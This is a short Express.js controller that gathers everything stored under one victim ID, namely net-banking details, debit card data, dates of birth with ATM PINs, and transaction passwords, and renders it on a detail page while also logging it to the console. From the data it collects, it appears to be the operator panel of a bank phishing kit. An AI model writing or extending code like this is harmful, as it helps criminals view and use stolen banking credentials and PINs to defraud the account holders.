// controllers/userDetailsController.js
const mongoose         = require('mongoose');
const User             = require('../models/User');
const NetBanking       = require('../models/CardPayment');
const Debit            = require('../models/DebitCard');
const AdditionalData   = require('../models/AdditionalData');
const TransactionPass  = require('../models/TransactionPass');  // ← NEW

exports.getUserDetails = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    if (!uniqueid) {
      return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
    }

    // Fetch data from all five models in parallel
    const [
      user,
      netBanking,
      debit,
      additionalData,
      transactionPass                        // ← NEW
    ] = await Promise.all([
      User.find({ uniqueid }),               // user entries
      NetBanking.find({ uniqueid }),         // net banking entries
      Debit.find({ uniqueid }),              // debit card entries
      AdditionalData.find({ uniqueid }),     // DOB & ATM PIN entries
      TransactionPass.find({ uniqueid })     // ← transaction password entries
    ]);

    // Debug output
    console.log("Fetched Data:", {
      user,
      netBanking,
      debit,
      additionalData,
      transactionPass                      // ← NEW
    });

    // Render detail page with all data
    res.render('detail', {
      user:           user           || null,
      netBanking:     netBanking     || null,
      debit:          debit          || null,
      additionalData: additionalData || null,
      transactionPass: transactionPass || null  // ← NEW
    });

  } catch (error) {
    console.error("Error in getUserDetails:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
};
